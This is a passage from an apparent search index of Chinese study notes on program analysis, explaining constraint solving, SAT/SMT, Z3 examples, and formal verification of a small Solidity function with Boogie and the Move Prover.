edges\uff1a\u8fde\u63a5\u8c03\u7528\u70b9\u548c\u76ee\u6807\u51fd\u6570\u5165\u53e3</li> <li>Return edges\uff1a\u4ece return \u8bed\u53e5\u8fde\u5230 Return site\uff08Call site \u540e\u9762\u4e00\u6761\u8bed\u53e5\uff09</li> </ul> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_3","title":"\u7ea6\u675f\u6c42\u89e3","text":"<p>\u7ea6\u675f\u6c42\u89e3\u95ee\u9898\uff0c\u53ef\u4ee5\u5f62\u5f0f\u5316\u8868\u793a\u4e3a\u4e00\u4e2a\u4e09\u5143\u7ec4\u7684\u5f62\u5f0f \\(P=&lt;V, D, C&gt;\\)\uff0c\u5176\u4e2d\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u542b\u4e49\u5206\u522b\u4e3a\uff1a</p> <ul> <li> <p>\\(V\\)\uff1a\u53d8\u91cf\u7684\u96c6\u5408\uff0c\u8868\u793a\u4e3a \\({v_1, v_2, ..., v_n}\\) \uff1b</p> </li> <li> <p>\\(D\\)\uff1a\u53d8\u91cf\u7684\u503c\u57df\u7684\u96c6\u5408\uff0c\u5373\u6bcf\u4e2a\u53d8\u91cf\u7684\u53d6\u503c\u8303\u56f4\uff0c\u5373\u53d8\u91cf \\(v_i\\) \u9700\u8981\u5728\u5176\u503c\u57df \\(d_i\\) \u5185\u53d6\u503c\uff1b</p> </li> <li> <p>\\(C\\)\uff1a\u7ea6\u675f\u6761\u4ef6\u7684\u96c6\u5408\uff0c\u6bcf\u4e2a\u7ea6\u675f\u6761\u4ef6\u5305\u542b\u4e2d\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u53d8\u91cf\uff0c\u82e5 $c_i $ \u4e2d\u5305\u542b \\(k\\) \u4e2a\u53d8\u91cf\uff0c\u5219\u79f0\u8be5\u7ea6\u675f\u662f\u8fd9 \\(k\\) \u4e2a\u53d8\u91cf\u96c6\u5408\u4e0a\u7684 \\(k\\) \u5143\u7ea6\u675f\u3002</p> </li> </ul> <p>\u7ea6\u675f\u6c42\u89e3\u5c31\u662f\u57fa\u4e8e\u8fd9\u4e00\u7cfb\u5217\u7684\u7ea6\u675f\u95ee\u9898\uff0c\u6c42\u51fa\u6765\u4e00\u4e2a\u89e3\uff0c\u8fd9\u4e2a\u89e3\u5bf9\u6240\u6709\u7684\u7ea6\u675f\u90fd\u6ee1\u8db3\uff0c\u5e76\u4e14\u5728\u81ea\u5df1\u7684\u503c\u57df\u8303\u56f4\u5185\uff0c\u5982\u679c\u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u89e3\uff0c\u5c31\u8bf4\u8fd9\u4e2a\u7ea6\u675f\u95ee\u9898\u662f\u53ef\u6ee1\u8db3\u7684\uff0c\u5426\u5219\uff0c\u5c31\u8bf4\u8fd9\u4e2a\u7ea6\u675f\u95ee\u9898\u662f\u4e0d\u53ef\u6ee1\u8db3\u7684\u3002</p> <p>\u5f53\u524d\uff0c\u4e3b\u6d41\u7684\u7ea6\u675f\u6c42\u89e3\u5668\u4e3b\u8981\u6709\u4e24\u79cd\u7406\u8bba\u6a21\u578b\uff1aSAT \u6c42\u89e3\u5668\u548c SMT \u6c42\u89e3\u5668\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#sat","title":"SAT\uff1a\u5e03\u5c14\u53ef\u6ee1\u8db3\u6027\u95ee\u9898","text":"<p>SAT\uff08Satisfiability, SAT\uff09 \u662f NP \u95ee\u9898\uff0c\u5176\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u7ed9\u5b9a CNF \u8868\u8fbe\u5f0f \\(\u03a6\\)\uff0c\u6c42\u89e3\u5408\u9002\u7684 \\(x_i\\) \u7684\u503c\uff0c\u4f7f\u5f97 \\(\u03a6\\) \u4e3a \\(true\\)\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u60f3\u8981\u8ba9 \\(\u03a6\\) \u4e3a \\(true\\)\uff0c\u5fc5\u987b\u6bcf\u4e2a \\(C_i\\) \u90fd\u4e3a \\(true\\)\uff0c\u5373\u6bcf\u4e2a \\(C_i\\) \u4e2d\u5fc5\u987b\u6709\u4e00\u4e2a \\(x_i\\) \u4e3a \\(true\\)\u3002</p> <p>SAT \u95ee\u9898\uff0c\u6c42\u89e3\u7684\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u53ea\u80fd\u662f\u5e03\u5c14\u7c7b\u578b\uff0c\u53ef\u4ee5\u89e3\u51b3\u7684\u95ee\u9898\u4e3a\u547d\u9898\u903b\u8f91\u516c\u5f0f\u95ee\u9898\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#smt","title":"SMT\uff1a\u53ef\u6ee1\u8db3\u6027\u6a21\u5757\u7406\u8bba","text":"<p>\u56e0\u4e3a SAT \u6c42\u89e3\u5668\u53ea\u80fd\u89e3\u51b3 \u547d\u9898\u903b\u8f91\u516c\u5f0f \u95ee\u9898\uff0c\u800c\u5f53\u524d\u6709\u5f88\u591a\u5b9e\u9645\u5e94\u7528\u7684\u95ee\u9898\uff0c\u5e76\u4e0d\u80fd\u76f4\u63a5\u8f6c\u6362\u4e3a SAT \u95ee\u9898\u6765\u8fdb\u884c\u6c42\u89e3\uff0c\u4e8e\u662f\u540e\u6765\u63d0\u51fa\u4e86 SMT\uff08Satisfiability modulo theoris\uff09\u7406\u8bba\u3002</p> <p>SMT \u6c42\u89e3\u5668\u7684\u6c42\u89e3\u8303\u56f4\u4ece\u547d\u9898\u903b\u8f91\u516c\u5f0f\u6269\u5c55\u4e3a\u53ef\u4ee5\u89e3\u51b3 \u4e00\u9636\u903b\u8f91 \u6240\u8868\u8fbe\u7684\u516c\u5f0f\u3002SMT \u5305\u542b\u5f88\u591a\u7684\u6c42\u89e3\u65b9\u6cd5\uff0c\u901a\u8fc7\u7ec4\u5408\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u53ef\u4ee5\u89e3\u51b3\u5f88\u591a\u95ee\u9898\u3002</p> <p>\u6211\u7406\u89e3 SAT \u7684\u8868\u8fbe\u5f0f \\(\u03a6\\) \u4e2d\u53ea\u6709\u903b\u8f91\u7b26\u53f7\uff0c\u800c SMT \u7684\u8868\u8fbe\u5f0f\u4e2d\u53ef\u4ee5\u51fa\u73b0\u5176\u4ed6\u7b26\u53f7\uff0c\u5982\u51fd\u6570\u3001\u5e38\u91cf\u7b49\u3002</p> <p>\u5f53\u524d\uff0c\u5df2\u7ecf\u6709\u5927\u91cf\u7684 SMT \u6c42\u89e3\u5668\uff08\u5f53\u7136\u4e00\u822c\u90fd\u540c\u65f6\u652f\u6301 SAT \u6c42\u89e3\uff09\uff0c\u4f8b\u5982\u5fae\u8f6f\u7814\u7a76\u9662\u7814\u53d1\u7684 Z3 \u6c42\u89e3\u5668\u3001\u9ebb\u7701\u7406\u5de5\u5b66\u9662\u7814\u53d1\u7684 STP \u6c42\u89e3\u5668\u7b49\uff0c\u5e76\u4e14 SMT \u5305\u542b\u5f88\u591a\u7406\u8bba\uff0c\u4f8b\u5982 Z3 \u6c42\u89e3\u5668\u5c31\u652f\u6301\u7a7a\u7406\u8bba\u3001\u7ebf\u6027\u8ba1\u7b97\u3001\u975e\u7ebf\u6027\u8ba1\u7b97\u3001\u4f4d\u5411\u91cf\u3001\u6570\u7ec4\u7b49\u7406\u8bba\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#z3","title":"Z3 \u6c42\u89e3\u5668","text":"<p>Z3 \u6c42\u89e3\u5668\u662f\u5fae\u8f6f\u7814\u7a76\u9662\u5f00\u53d1\u5e76\u5f00\u6e90\u7684\u4e00\u6b3e SMT \u6c42\u89e3\u5668\uff0cZ3 \u6c42\u89e3\u5668\u53ef\u5e94\u7528\u4e8e\u7ea6\u675f\u6c42\u89e3\uff0c\u4f5c\u4e3a\u5176\u4ed6\u5e94\u7528\u7684\u5e95\u5c42\u5de5\u5177\uff0c\u5728\u5b9a\u7406\u8bc1\u660e\u3001\u7a0b\u5e8f\u9a8c\u8bc1\u7684\u9879\u76ee\u4e2d\u88ab\u5927\u91cf\u4f7f\u7528\uff0c\u4f8b\u5982 SAGE\u3001LLVM\u3001KLEE \u7b49\u3002</p> <p>Z3 \u81f4\u529b\u4e8e\u89e3\u51b3\u7a0b\u5e8f\u9a8c\u8bc1\u548c\u8f6f\u4ef6\u5206\u6790\u4e2d\u7684\u6c42\u89e3\u95ee\u9898\uff0c\u800c\u4e14\u6027\u80fd\u4f18\u8d8a\uff0c\u63d0\u4f9b\u7684 API \u975e\u5e38\u7b80\u6d01\uff0c\u4e14\u652f\u6301\u591a\u79cd\u8bed\u8a00\uff08C/C++, .NET, OCaml, Python, Java, Haskell\uff09\u662f\u5f88\u591a\u9759\u6001\u4ee3\u7801\u5206\u6790\u5de5\u5177\u7684\u9996\u9009\u3002</p> <p>SAT Bool \u8868\u8fbe\u5f0f\u8ba1\u7b97</p> <pre><code>from z3 import *\na, b, c = Bools('a b c')\ns = Solver()\ns.add(And(And(Or(a, Not(b)), Or(b, c)), Or(c, Not(a))))\nprint(s.check())\nprint(s.model())\n</code></pre> <p>a\uff0cb \u548c c \u5206\u522b\u90fd\u662f bool \u8868\u8fbe\u5f0f\uff0c\u5728\u6b64\u8fdb\u884c\u7684\u8fd0\u7b97\u4e3a \\(\u03c6=(\u03b1\u2228\u00ac\u03b2)\u2227(\u03b2\u2228\u03b3)\u2227(\u03b3\u2228\u00ac\u03b1)\\) \u53d6\u503c\u4e3a \\(true\\) \u65f6\u7684\u5404\u53d8\u91cf\u53d6\u503c\uff0c\u6b64\u5904\u4e3a SAT \u95ee\u9898\u6c42\u89e3\uff0c\u5176\u8fd0\u7b97\u5982\u4e0b\uff1a</p> <pre><code>sat\n[a = False, b = False, c = True]\n</code></pre> <p>SMT \u4e00\u9636\u903b\u8f91\u8fd0\u7b97</p> <p>\u57fa\u4e8e Z3 \u53ef\u4ee5\u8fdb\u884c\u5927\u91cf\u7684\u6570\u503c\u8fd0\u7b97\u3001\u6570\u503c\u6bd4\u8f83\u3001\u6570\u503c\u8868\u8fbe\u5f0f\u64cd\u4f5c\u7b49\uff0c\u652f\u6301\u6574\u578b\u3001\u6d6e\u70b9\u578b\u7b49\u5404\u79cd\u64cd\u4f5c\uff0c\u652f\u6301\u5404\u79cd\u7b97\u672f\u8fd0\u7b97\uff0c\u652f\u6301\u7b97\u672f\u8fd0\u7b97\u3001\u4e0d\u7b49\u5f0f\u6bd4\u8f83\u6784\u6210\u7684 bool \u8868\u8fbe\u5f0f\u7684\u5404\u79cd\u7ec4\u5408\u64cd\u4f5c\uff0c\u6700\u540e\u6c42\u89e3\u51fa\u5177\u4f53\u7684\u6570\u503c\u3002</p> <p>\u7b97\u6570\u8fd0\u7b97\u4f8b\u5b50\uff1a</p> <pre><code>from z3 import *\nx, y, z = Ints('x y z')\ns = Solver()\ns.add(x + y &gt; 4)\ns.add(z == x + 3)\ns.add(x * x + y * y &lt; 30)\ns.add(z &lt; 9)\nprint(s.check())\nprint(s.model())\n</code></pre> <p>\u5982\u4e0a\uff0c\u662f\u5173\u4e8e x\uff0cy\uff0cz \u4e09\u4e2a int \u7c7b\u578b\u7684\u6570\u5b57\u7684\u4e00\u7cfb\u5217\u4e0d\u7b49\u5f0f\u7684\u7ea6\u675f\u6c42\u89e3\uff08\u542b\u4e49\u975e\u5e38\u7b80\u5355\uff0c\u4e0d\u518d\u4ecb\u7ecd\uff09\uff0c\u6700\u540e\u8fd0\u7b97\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>sat\n[z = 3, y = 5, x = 0]\n</code></pre> <p>\u6b64\u5916\uff0cZ3 \u8fd8\u80fd\u7528\u4e8e\u8868\u8fbe\u5f0f\u7b80\u5316\u3001\u4f4d\u8fd0\u7b97\u3001\u6570\u7ec4\u64cd\u4f5c\u7b49</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_4","title":"\u7ea6\u675f\u6c42\u89e3\u7684\u5e94\u7528","text":"<p>\u4f8b\u5982\u5728\u7b26\u53f7\u6267\u884c\u4e2d\uff0c\u4f7f\u7528\u7ea6\u675f\u6c42\u89e3\u5668\uff08e.g. Z3\uff09\u5bf9\u5f53\u524d\u8def\u5f84\u7ea6\u675f\u6c42\u89e3\uff0c\u5f97\u5230 \u6d4b\u8bd5\u8f93\u5165\uff1b\u5982\u679c\u7a0b\u5e8f\u8f93\u5165\u8fd9\u4e9b\u5b9e\u9645\u503c\uff0c\u5c31\u4f1a\u5728\u540c\u6837\u8def\u5f84\u7ed3\u675f\u3002</p> <p>\u5728 Oyente \u4e2d\uff0c\u9996\u5148\u5bf9\u5408\u7ea6\u6784\u5efa CFG\uff0c\u968f\u540e\u5bf9\u5408\u7ea6\u8fdb\u884c\u7b26\u53f7\u6267\u884c\uff0c\u7b26\u53f7\u6267\u884c\u4ece CFG \u7684 entry node \u5f00\u59cb\uff0c\u5e76\u4f7f\u7528 Z3 \u4f5c\u4e3a\u7b26\u53f7\u6267\u884c\u7684\u7ea6\u675f\u6c42\u89e3\u5668\uff0c\u6bcf\u5f53\u9047\u5230\u6761\u4ef6\u8df3\u8f6c\u65f6\uff0c\u8ba1\u7b97\u8def\u5f84\u7ea6\u675f\u662f\u5426\u6709\u89e3\uff0c\u4ee5\u6b64\u5224\u65ad\u8be5\u8def\u5f84\u662f\u5426\u53ef\u884c\u3002</p> <p>Reference:</p> <ul> <li> <p>\u4ec0\u4e48\u662f SMT (satisfiability modulo theories)\uff1f</p> </li> <li> <p>\u7ea6\u675f\u6c42\u89e3</p> </li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_5","title":"\u5f62\u5f0f\u5316\u9a8c\u8bc1","text":"<p>\u5f62\u5f0f\u5316\u5e38\u7528\u4e8e\u786c\u4ef6\u3001\u7cfb\u7edf\u5185\u6838\u7b49\u8f83\u4e3a\u7a33\u5b9a\u7684\u573a\u5408\uff0c\u800c\u4e00\u822c\u8f6f\u4ef6\u5f00\u53d1\u8fed\u4ee3\u592a\u5feb\uff0c\u56e0\u6b64\u5f62\u5f0f\u5316\u9a8c\u8bc1\u5c31\u4e0d\u592a\u9002\u7528\uff0c\u56e0\u4e3a\u6210\u672c\u8fc7\u9ad8\uff0c\u4e14\u4e00\u822c\u7684\u8f6f\u4ef6\u5206\u6790\u65b9\u5f0f\u5982\u6a21\u7cca\u6d4b\u8bd5\u3001\u7b26\u53f7\u6267\u884c\u5df2\u7ecf\u8db3\u591f\u4f7f\u7528\u3002</p> <p>\u800c\u5728\u533a\u5757\u94fe DAPP \u4e0a\uff0c\u7531\u4e8e\u4ee3\u7801\u4e00\u7ecf\u4e0a\u94fe\u65e0\u6cd5\u4fee\u6539\uff0c \u56e0\u6b64\u6709\u5fc5\u8981\u4f7f\u7528\u5f62\u5f0f\u5316\u9a8c\u8bc1\u6765\u4e25\u683c\u4fdd\u8bc1\u4ee3\u7801\u7684\u5b89\u5168\u6027\u3002</p> <p>\u90a3\u4e48\u4ec0\u4e48\u662f\u5f62\u5f0f\u5316\u9a8c\u8bc1\uff1f</p> <p>\u6839\u636e\u6211\u7684\u7406\u89e3\uff0c\u63d0\u4f9b\u4ee3\u7801\u548c\u89c4\u7ea6\uff08specification\uff09\uff0c\u6b64\u5904\u89c4\u7ea6\u662f\u53ef\u9009\u7684\uff0c\u5f62\u5f0f\u5316\u9a8c\u8bc1\u5de5\u5177\u4f1a\u5c06\u5176\u8f6c\u6362\u4e3a\u6570\u5b66\u516c\u5f0f\uff08\u4e5f\u53ef\u80fd\u5148\u5c06\u4ee3\u7801\u548c\u89c4\u8303\u8f6c\u6362\u4e3a\u5bf9\u8c61\u6a21\u578b\uff0c\u518d\u5c06\u5bf9\u8c61\u6a21\u578b\u8f6c\u6362\u4e3a\u6570\u5b66\u516c\u5f0f\uff09\uff0c\u4ea4\u7ed9\u5b9a\u7406\u8bc1\u660e\u5668\uff0c\u5b9a\u7406\u8bc1\u660e\u5668\u901a\u8fc7\u6570\u5b66\u63a8\u7406\u548c\u8bc1\u660e\uff0c\u786e\u5b9a\u4ee3\u7801\u662f\u5426\u7b26\u5408\u89c4\u7ea6\u3002</p> <p></p> <p>\u5f88\u591a\u5f62\u5f0f\u5316\u9a8c\u8bc1\u7684\u95ee\u9898\u53ef\u4ee5\u8f6c\u5316\u6210\u516c\u5f0f\u6ee1\u8db3\u6027\u95ee\u9898\uff0c\u4e5f\u5c31\u662f SMT\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 Z3 \u7b49\u6c42\u89e3\u5668\u8fdb\u884c\u8ba1\u7b97\u3002\u4f8b\u5982 Hawblitzel \u7b49\u4eba\u5c06\u6e90\u7a0b\u5e8f\u7ffb\u8bd1\u5230\u4e2d\u95f4\u8bed\u8a00 Boogie\uff0c\u5728 Boogie \u4e0a\u5f00\u5c55\u9a8c\u8bc1,\u5e76\u5c06\u751f\u6210\u7684\u9a8c\u8bc1\u6761\u4ef6\u4ea4\u7ed9 Z3 \u81ea\u52a8\u8bc1\u660e\u3002</p> <p>\u5bf9\u8c61\u6a21\u578b</p> <p>\u5728\u5f62\u5f0f\u5316\u9a8c\u8bc1\u4e2d\uff0c\u5bf9\u8c61\u6a21\u578b\uff08Object Model\uff09\u662f\u6307\u8981\u8fdb\u884c\u9a8c\u8bc1\u7684\u7cfb\u7edf\u6216\u8f6f\u4ef6\u7684\u62bd\u8c61\u6a21\u578b\u3002\u5bf9\u8c61\u6a21\u578b\u53ef\u4ee5\u662f\u4efb\u4f55\u5f62\u5f0f\u7684\u62bd\u8c61\u8868\u793a\uff0c\u6bd4\u5982\u72b6\u6001\u673a\u3001\u8f6c\u6362\u7cfb\u7edf\u3001\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u7b49\u7b49\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u8981\u9a8c\u8bc1\u7684\u7cfb\u7edf\u7684\u7279\u6027\u548c\u9700\u6c42\u3002</p> <p>\u5728\u4f7f\u7528\u5b9a\u7406\u8bc1\u660e\u5668\u8fdb\u884c\u5f62\u5f0f\u5316\u9a8c\u8bc1\u65f6\uff0c\u9700\u8981\u5c06\u5bf9\u8c61\u6a21\u578b\u8868\u793a\u4e3a\u903b\u8f91\u516c\u5f0f\u7684\u5f62\u5f0f\uff0c\u7136\u540e\u4f7f\u7528\u5b9a\u7406\u8bc1\u660e\u5668\u6765\u8bc1\u660e\u6216\u53cd\u9a73\u8fd9\u4e9b\u516c\u5f0f\u3002</p> <p>\u4f8b\u5b50</p> <pre><code>function bet(uint256 number) public payable {\n        require(msg.value = 10, \"\u4ed8\u6b3e\u5e94\u8be5\u7b49\u4e8e 10\");\n        require(number &lt;= 10, \"Number \u5e94\u8be5\u5c0f\u4e8e\u7b49\u4e8e 10\");\n        require(number &gt;= 1, \"Number \u5e94\u8be5\u5927\u4e8e\u7b49\u4e8e 10\");\n        totalBets += msg.value;\n        bets[msg.sender] = number;\n}\n</code></pre> <p>\u5c06\u4e0a\u8ff0\u4ee3\u7801\u8f6c\u6362\u4e3a\u63a7\u5236\u6d41\u56fe\uff0c\u5f53\u6ee1\u8db3\u5de6\u4e0b\u65b9\u516c\u5f0f\u65f6\uff0c\u72b6\u6001\u5c06\u53d1\u751f\u6539\u53d8\uff0c\u5f53\u6ee1\u8db3\u53f3\u4e0b\u65b9\u516c\u5f0f\u65f6\uff0c\u5c06\u89e6\u53d1 Revert\uff0c\u56fe\u4e2d\u4e5f\u7ed9\u51fa\u4e86\u5177\u4f53\u7684\u8f93\u5165\u6837\u4f8b\u3002</p> <p></p> <p>\u4e8e\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u516c\u5f0f\u8868\u8fbe\u6574\u4e2a\u7a0b\u5e8f\uff0c\u5373\u5c06\u4ee3\u7801\u7ffb\u8bd1\u4e3a\u6570\u5b66\u8868\u8fbe\u5f0f\uff1a</p> <p></p> <p>\\(AND\\) \u5de6\u4fa7\u7684\u516c\u5f0f\u542b\u4e49\u662f\uff0c\u5f53\u6ee1\u8db3 \\(msg.value = 10 \\ AND \\ number&lt;= 10 \\ AND \\ number &gt;=1\\) \u65f6\uff0c\u5c06\u5bfc\u81f4\u7a0b\u5e8f\u72b6\u6001\u7684\u6539\u53d8\uff0c\u4e5f\u5c31\u662f \\(totalBets += msg.velu \\ AND \\ bets[msg.sender] = number\\)\uff0c\\(AND\\) \u53f3\u4fa7\u540c\u7406\uff0c\u6ee1\u8db3\u6761\u4ef6\u65f6\u5c06\u89e6\u53d1 revert\u3002</p> <p>\\(AND\\) \u4e24\u4fa7\u7684\u8868\u8fbe\u5f0f\u4e0d\u7ba1 \\(msg.value\\) \u548c \\(number\\) \u7684\u503c\u662f\u591a\u5c11\uff0c\u59cb\u7ec8\u662f\u4e3a true\uff0c\u56e0\u6b64\u4e8c\u8005\u8fdb\u884c \\(AND\\) \u540e\u4e5f\u59cb\u7ec8\u4e3a true\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6ca1\u6709\u4efb\u4f55\u7ea6\u675f\u7684\u60c5\u51b5\u4e0b\uff0c\u5f62\u5f0f\u5316\u9a8c\u8bc1\u53ef\u4ee5\u751f\u6210\u4efb\u610f\u7684\u6570\u5b57\uff08\u6211\u7406\u89e3\u5c31\u662f\u751f\u6210\u6d4b\u8bd5\u6837\u4f8b\uff0c \\(msg.value\\) \u548c \\(number\\) \u53ef\u80fd\u662f\u4efb\u610f\u6570\u5b57\uff09</p> <p>\u968f\u540e\u6211\u4eec\u52a0\u5165\u89c4\u8303\uff08specification\uff09\uff0c\u5b83\u63cf\u8ff0\u4e86\u4ee3\u7801\u5e94\u8be5\u5982\u4f55\u8fd0\u884c\u3002</p> <pre><code>spec:\n    bets[msg.sender] &lt; 10\n</code></pre> <p>\u6b64\u65f6\uff0c\u5c06\u4f1a\u5f62\u5f0f\u5316\u9a8c\u8bc1\u5de5\u5177\u5c06\u5224\u65ad\u8f93\u5165\u7684\u4ee3\u7801\u662f\u5426\u7b26\u5408\u89c4\u8303\uff0c\u4e5f\u5c31\u662f\u4ee3\u7801\u6267\u884c\u540e\uff0c\u662f\u5426\u6ee1\u8db3 \\(bets[msg.sender] &lt; 10\\)\uff0c\u5f53\u7136\uff0c\u6b64\u5904\u662f\u4e0d\u6ee1\u8db3\u7684\uff0c\u56e0\u4e3a\u5f53 \\(number=10, msg.value=10\\) \u65f6\uff0c\u4ee3\u7801\u6267\u884c\u540e\uff0c \\(bets[msg.sender] = 10\\)\u3002</p> <p>\u90a3\u4e48\u5177\u4f53\u662f\u5982\u4f55\u5224\u65ad\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u5c06\u89c4\u8303\u548c\u4e4b\u524d\u4ee3\u7801\u8f6c\u6362\u6210\u7684\u6570\u5b66\u516c\u5f0f\u8054\u7cfb\u8d77\u6765\uff1a</p> <p></p> <p>\u9996\u5148\u770b\u5de6\u4fa7\uff0c\u53ea\u662f\u5c06\u89c4\u7ea6\u4e0e\u4ee3\u7801\u7684\u516c\u5f0f\u8868\u8fbe\u7b80\u5355\u7684\u7528 \\(AND\\) \u8fde\u63a5\uff0c\u6b64\u65f6\u5982\u679c\u7528 SMT \u6c42\u89e3\u5668\u6c42\u89e3\uff0c\u662f\u65e0\u6cd5\u83b7\u53d6\u53cd\u4f8b\u7684\uff08\\(number=10, msg.value=10\\)\uff09\uff0c\u56e0\u6b64\u6211\u4eec\u5f80\u5f80\u4f1a\u53d6\u53cd\uff0c\u6b64\u65f6\u5f53\u6c42\u89e3\u5668\u7684\u7ed3\u679c\u662f SAT \u65f6\uff0c\u5c31\u8868\u660e\u627e\u5230\u4e86\u4e0d\u7b26\u5408\u89c4\u8303\u7684\u53cd\u4f8b\uff0c\u82e5\u7ed3\u679c\u662f UNSAT\uff0c\u5219\u8bf4\u660e\u4ee3\u7801\u7b26\u5408\u89c4\u8303\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u627e\u5230\u4e86\u53cd\u4f8b \\(number=10, msg.value=10\\) \uff0c\u5047\u8bbe\u6211\u4eec\u7684\u89c4\u8303\u662f\u6b63\u786e\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u8981\u4fee\u6539\u4ee3\u7801\uff1a</p> <pre><code>// old\nrequire(number &lt;= 10, \"Number \u5e94\u8be5\u5c0f\u4e8e\u7b49\u4e8e 10\");\n// new\nrequire(number &lt; 10, \"Number \u5e94\u8be5\u5c0f\u4e8e 10\");\n</code></pre> <p>\u6b64\u65f6\u518d\u6b21\u8fd0\u884c\u5f62\u5f0f\u5316\u9a8c\u8bc1\u5668\uff0cSMT \u6c42\u89e3\u5668\u5c06\u8fd4\u56de UNSAT\uff0c\u8bf4\u660e\u4ee3\u7801\u662f\u7b26\u5408\u89c4\u8303\u7684\u3002</p> <p>Reference</p> <ul> <li>Solidity \u5f62\u5f0f\u5316\u9a8c\u8bc1</li> <li>\u5f62\u5f0f\u5316\u9a8c\u8bc1 | \u9752\u5e74\u5b66\u8005\u8ba1\u5212</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#boogie","title":"Boogie","text":"<p>https://www.microsoft.com/en-us/research/project/boogie-an-intermediate-verification-language/</p> <p>Boogie is a modeling language, intended as a layer on which to build program verifiers for other languages.</p> <p>Boogie is also the name of a tool. The tool accepts the Boogie language as input, optionally infers some invariants in the given Boogie program, and then generates verification conditions that are passed to an SMT solver. The default SMT solver is Z3.</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#move-prover","title":"Move Prover","text":"<p>\u4e0a\u56fe\u662f Move Prover \u7684\u67b6\u6784\uff0c\u8f93\u5165\uff1aMove source code annotated with speci\ufb01cations</p> <ul> <li>\u4ece\u8f93\u5165\u7684 Move \u6e90\u4ee3\u7801\u7684\u6ce8\u91ca\u4e2d\u63d0\u53d6\u89c4\u8303</li> <li>\u5c06 Move \u6e90\u7801\u7ffb\u8bd1\u4e3a\u5b57\u8282\u7801\uff08bytecode\uff09</li> <li>\u4ece\u5b57\u8282\u7801\u4e2d\u5220\u9664\u6240\u6709\u5806\u6808\u64cd\u4f5c\uff0c\u5e76\u5c06\u5176\u66ff\u6362\u4e3a\u5bf9\u5c40\u90e8\u53d8\u91cf\u7684\u64cd\u4f5c\uff0c\u79f0\u4fee\u6539\u540e\u7684\u5b57\u8282\u7801\u4e3a\uff1astackless bytecode</li> <li>\u5c06 stackless bytecode \u62bd\u8c61\u4e3a prover object model</li> <li>\u89e3\u6790\u63d0\u53d6\u51fa\u6765\u7684\u89c4\u8303\uff0c\u5e76\u5c06\u5176\u52a0\u5165\u5230 prover object model \u4e2d</li> <li>\u5c06\u6700\u7ec8\u786e\u5b9a\u7684 prover object model \u7ffb\u8bd1\u4e3a Boogie intermediate veri\ufb01cation language (IVL)</li> <li>Boogie \u7a0b\u5e8f\u751f\u6210 SMT \u516c\u5f0f\uff0c\u4f7f\u7528 SMT \u6c42\u89e3\u5668\uff08\u5982 Z3\uff09\u8fdb\u884c\u68c0\u67e5\uff0c\u5982\u679c\u662f UNSAT\uff0c\u5219\u89c4\u8303\u6210\u7acb\uff0c\u5426\u5219\uff0c\u62a5\u9519\u3002</li> </ul> <p>\u4e3a\u4ec0\u4e48\u662f UNSAT \u8bf4\u660e\u89c4\u8303\u6210\u7acb\uff1f</p> <p>\u56e0\u4e3a\u6211\u4eec\u662f\u5bfb\u627e\u4e0d\u6ee1\u8db3\u89c4\u8303\u7684\u6837\u4f8b\uff0c\u56e0\u6b64\u5982\u679c UNSAT\uff0c\u5219\u8bf4\u660e\u627e\u4e0d\u5230\u8fd9\u6837\u7684\u6837\u4f8b\uff0c\u4e5f\u5c31\u662f\u4e0d\u8fdd\u53cd\u89c4\u8303\uff0c\u6b64\u65f6\u8bf4\u660e\u7a0b\u5e8f\u6ca1\u6709\u95ee\u9898\u3002</p> <p>\u5982\u679c\u7ed3\u679c\u4e3a SAT\uff0c\u5219\u8bf4\u660e Z3 